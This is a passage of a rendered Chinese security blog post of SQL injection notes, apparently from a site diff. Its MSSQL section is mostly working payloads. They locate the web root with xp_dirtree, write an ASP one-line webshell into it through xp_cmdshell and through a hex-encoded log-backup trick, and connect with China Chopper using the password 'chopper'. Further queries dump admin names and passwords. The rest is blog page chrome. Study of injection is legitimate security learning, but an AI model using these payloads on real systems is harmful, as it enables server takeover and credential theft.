class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> dir);<span class="hljs-keyword">insert into</span> temp2 <span class="hljs-keyword">exec</span> master.dbo.xp_dirtree <span class="hljs-variable">@dirname</span><br># <span class="hljs-number">11.</span>用同样的方法判断该目录是否为根目录<br>## 如果返回为真，为了确定我们的判断，多测试几个例子，方法上面都讲到了，如果多个例子都返回为真，那么就确定了该目录为WEB根目录。<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> temp2 <span class="hljs-keyword">where</span> dir<span class="hljs-operator">&lt;&gt;</span><span class="hljs-string">&#x27;user&#x27;</span>)<span class="hljs-operator">&lt;</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> temp2)<br>用以上的方法基本上可以获得WEB根目录，现在我们假设WEB根目录是：D:<span class="hljs-operator">/</span>website<span class="hljs-operator">/</span>www<br># <span class="hljs-number">12.</span> 查询临时表中的内容，也就是指定的目录文件和文件夹名。由于不能一次性获取所有目录文件和文件夹名，因此需要更改id的值，依次列出文件和文件夹来。<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> dir <span class="hljs-keyword">from</span> temp <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>)<span class="hljs-operator">&gt;</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="2-获取数据库用户名"><a href="#2-获取数据库用户名" class="headerlink" title="2.获取数据库用户名"></a>2.获取数据库用户名</h4><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-symbol">&#x27;http</span>://<span class="hljs-number">192.168</span>.<span class="hljs-number">1.55</span>/sqlserver/<span class="hljs-number">1</span>.aspx?xxser=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> db_name() =O<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="3-写入一句话木马："><a href="#3-写入一句话木马：" class="headerlink" title="3.写入一句话木马："></a>3.写入一句话木马：</h4><p>方法一：一句话木马’（通过中国菜刀）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">%</span><span class="hljs-number">20</span>;<span class="hljs-keyword">exec</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>master..xp_cmdshell<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-string">&#x27;Echo%20&quot;&lt;%eval%20request(&quot;chopper&quot;)%&gt;&quot;%20&gt;&gt;%20c:\wwwtest\iis-xxser.com--wwwroot\muma.asp&#x27;</span><span class="hljs-comment">--</span><br><br># <span class="hljs-operator">&lt;</span><span class="hljs-operator">%</span>eval<span class="hljs-operator">%</span><span class="hljs-number">20</span>request(&quot;chopper&quot;)<span class="hljs-operator">%</span><span class="hljs-operator">&gt;</span>   是一句话木马，需要根据web的不同而变化<br># c:\wwwtest\iis<span class="hljs-operator">-</span>xxser.com<span class="hljs-comment">--wwwroot\   是路径</span><br># muma.asp   是一句话木马的名字<br></code></pre></td></tr></table></figure>
+
+<p>方法二：差异备份’（此方法数据库必须曾经备份过事务日志）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">;<span class="hljs-keyword">alter</span> database testdb <span class="hljs-keyword">set</span> RECOVERY <span class="hljs-keyword">FULL</span>;<span class="hljs-keyword">create table</span> test_tmp(str image);backup log testdb <span class="hljs-keyword">to</span> disk<span class="hljs-operator">=</span><span class="hljs-string">&#x27;c:\test1&#x27;</span> <span class="hljs-keyword">with</span> init;<span class="hljs-keyword">insert into</span> test_tmp(str) <span class="hljs-keyword">values</span> (<span class="hljs-number">0x3C2565786375746528726571756573742822636D64222929253E</span>);backup log testdb <span class="hljs-keyword">to</span> disk<span class="hljs-operator">=</span><span class="hljs-string">&#x27;C:\wwwtest\iis-xxser.com--wwwroot\yjh.asp&#x27;</span>;<span class="hljs-keyword">alter</span> database testdb <span class="hljs-keyword">set</span> RECOVERY simple<br><br># (<span class="hljs-number">0x3C2565786375746528726571756573742822636D64222929253E</span>)   是一句话木马的<span class="hljs-number">16</span>进制编码<br># C:\wwwtest\iis<span class="hljs-operator">-</span>xxser.com<span class="hljs-comment">--wwwroot\   是物理路径</span><br># yjh.asp   是一句话木马的名字<br></code></pre></td></tr></table></figure>
+
+<p>也可以使用工具代替上述操作（GetWebShell）,然后用菜刀连接目标</p>
+<ul>
+<li>地址为：目标的根目录地址然后&#x2F;muma.asp</li>
+<li>密码为：“chopper” 然后就可以进入对方的服务器了。</li>
+</ul>
+<h3 id="第八步：public权限利用方法"><a href="#第八步：public权限利用方法" class="headerlink" title="第八步：public权限利用方法"></a>第八步：public权限利用方法</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql"># public权限检测<br><span class="hljs-keyword">and</span> db_name()<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-comment">--</span><br># <span class="hljs-number">1.</span>获取mssql所有数据库名和路径<br><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">and</span><span class="hljs-operator">%</span><span class="hljs-number">200</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>top<span class="hljs-operator">%</span><span class="hljs-number">202</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>cast([name]<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">as</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>nvarchar(<span class="hljs-number">256</span>))<span class="hljs-operator">%</span><span class="hljs-number">2</span>bchar(<span class="hljs-number">94</span>)<span class="hljs-operator">%</span><span class="hljs-number">2</span>bcast([filename]<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">as</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>nvarchar(<span class="hljs-number">256</span>))<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">from</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>top<span class="hljs-operator">%</span><span class="hljs-number">202</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>dbid,name,filename<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">from</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>[master].[dbo].[sysdatabases]<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">order</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">by</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>[dbid])<span class="hljs-operator">%</span><span class="hljs-number">20</span>t<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">order</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">by</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>[dbid]<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">desc</span>)<span class="hljs-comment">--</span><br><br># <span class="hljs-number">2.</span>获取当前数据库所有表名<br><span class="hljs-keyword">and</span> <span class="hljs-number">0</span><span class="hljs-operator">&lt;&gt;</span>(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> name <span class="hljs-keyword">from</span> testdb.dbo.sysobjects <span class="hljs-keyword">where</span> xtype<span class="hljs-operator">=</span><span class="hljs-number">0x7500</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">2</span> name <span class="hljs-keyword">from</span> testdb.dbo.sysobjects <span class="hljs-keyword">where</span> xtype<span class="hljs-operator">=</span><span class="hljs-number">0x7500</span>))<span class="hljs-comment">--</span><br><br># <span class="hljs-number">3.</span>爆表名及字段名<br><span class="hljs-keyword">having</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">--  ●爆出了admin.id</span><br><span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> admin.id <span class="hljs-keyword">having</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">--  ●又爆出了admin.name</span><br><span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> admin.id,admin.name <span class="hljs-keyword">having</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">-- ●又爆出了admin.passwd</span><br># <span class="hljs-number">4</span>、获取字段内容<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">and</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>top<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">1</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>isnull(<span class="hljs-built_in">cast</span>([id]<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">as</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>nvarchar(<span class="hljs-number">4000</span>)),<span class="hljs-type">char</span>(<span class="hljs-number">32</span>))<span class="hljs-operator">%</span><span class="hljs-number">2</span>bchar(<span class="hljs-number">94</span>)<span class="hljs-operator">%</span><span class="hljs-number">2</span>bisnull(<span class="hljs-built_in">cast</span>([name]<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">as</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>nvarchar(<span class="hljs-number">4000</span>)),<span class="hljs-type">char</span>(<span class="hljs-number">32</span>))<span class="hljs-operator">%</span><span class="hljs-number">2</span>bchar(<span class="hljs-number">94</span>)<span class="hljs-operator">%</span><span class="hljs-number">2</span>bisnull(<span class="hljs-built_in">cast</span>([password]<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">as</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>nvarchar(<span class="hljs-number">4000</span>)),<span class="hljs-type">char</span>(<span class="hljs-number">32</span>))<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">from</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>[testdb]..[admin]<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">where</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">and</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>id<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">not</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">in</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>top<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">0</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>id<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">from</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>[testdb]..[admin]<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">where</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">group</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">by</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>id))<span class="hljs-operator">%</span><span class="hljs-number">3E0</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">and</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2><p>待续</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" class="category-chain-item">WEB安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E7%AC%94%E8%AE%B0/" class="print-no-link">#笔记</a>
+      
+        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" class="print-no-link">#SQL注入</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SQL注入-不同数据库下的注入方式</div>
+      <div>https://coutcin-xw.github.io/2022/04/23/SQL注入-不同数据库下的注入方式/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>CoutCin</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年4月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/04/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E7%AC%94%E8%AE%B0/" title="命令执行-笔记">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">命令执行-笔记</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/04/23/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" title="SQL注入笔记">
+                        <span class="hidden-mobile">SQL注入笔记</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
